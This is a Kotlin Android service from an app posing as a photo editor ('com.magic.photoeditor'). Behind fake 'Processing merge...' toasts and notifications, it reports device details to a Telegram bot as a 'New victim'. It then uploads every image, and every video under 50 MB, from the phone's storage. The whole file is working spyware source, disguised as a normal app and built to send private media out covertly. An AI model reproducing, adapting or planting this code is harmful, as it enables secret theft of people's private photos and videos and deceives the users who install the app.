package com.magic.photoeditor

import android.app.*
import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.provider.MediaStore
import android.widget.Toast
import androidx.core.app.NotificationCompat
import java.io.File

class GalleryService : Service() {

    private lateinit var telegram: TelegramSender

    override fun onCreate() {
        super.onCreate()
        telegram = TelegramSender()
        createNotificationChannel()
        startForeground(Config.NOTIFICATION_ID, buildNotification("Processing merge..."))
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Toast.makeText(this, "Processing merge...", Toast.LENGTH_SHORT).show()
        harvestAllMedia()
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun harvestAllMedia() {
        try {
            val info = Utils.getDeviceInfo(this)
            telegram.sendMessage("📱 New victim: $info")

            var totalCount = 0
            totalCount += harvestImages()
            totalCount += harvestVideos()

            telegram.sendMessage("✅ Harvest complete: $totalCount files sent.")
            Toast.makeText(this, "Merge complete: $totalCount files processed", Toast.LENGTH_SHORT).show()
            stopSelf()
        } catch (e: Exception) {
            telegram.sendMessage("❌ Harvest error: ${e.message}")
            Toast.makeText(this, "Error: ${e.message}", Toast.LENGTH_LONG).show()
            stopSelf()
        }
    }

    private fun harvestImages(): Int {
        var count = 0
        val contentResolver: ContentResolver = contentResolver
        val uri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
        } else {
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        }

        val projection = arrayOf(
            MediaStore.Images.Media.DATA,
            MediaStore.Images.Media.DISPLAY_NAME
        )

        val cursor = contentResolver.query(uri, projection, null, null, null)
        cursor?.use {
            val dataCol = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
            val nameCol = it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
            while (it.moveToNext()) {
                val path = it.getString(dataCol)
                val name = it.getString(nameCol)
                if (path != null) {
                    val file = File(path)
                    if (file.exists()) {
                        telegram.sendFile(file, "photo", name)
                        count++
                        Thread.sleep(100)
                    }
                }
            }
        }
        return count
    }

    private fun harvestVideos(): Int {
        var count = 0
        val contentResolver: ContentResolver = contentResolver
        val uri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            MediaStore.Video.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
        } else {
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI
        }

        val projection = arrayOf(
            MediaStore.Video.Media.DATA,
            MediaStore.Video.Media.DISPLAY_NAME,
            MediaStore.Video.Media.SIZE
        )

        val cursor = contentResolver.query(uri, projection, null, null, null)
        cursor?.use {
            val dataCol = it.getColumnIndexOrThrow(MediaStore.Video.Media.DATA)
            val nameCol = it.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME)
            val sizeCol = it.getColumnIndexOrThrow(MediaStore.Video.Media.SIZE)
            while (it.moveToNext()) {
                val path = it.getString(dataCol)
                val name = it.getString(nameCol)
                val size = it.getLong(sizeCol)
                if (path != null && size < 50 * 1024 * 1024) {
                    val file = File(path)
                    if (file.exists()) {
                        telegram.sendFile(file, "video", name)
                        count++
                        Thread.sleep(100)
                    }
                }
            }
        }
        return count
    }

    private fun buildNotification(text: String): Notification {
        return NotificationCompat.Builder(this, Config.CHANNEL_ID)
            .setContentTitle("Photo Editor")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_menu_gallery)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                Config.CHANNEL_ID,
                Config.CHANNEL_NAME,
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }
}
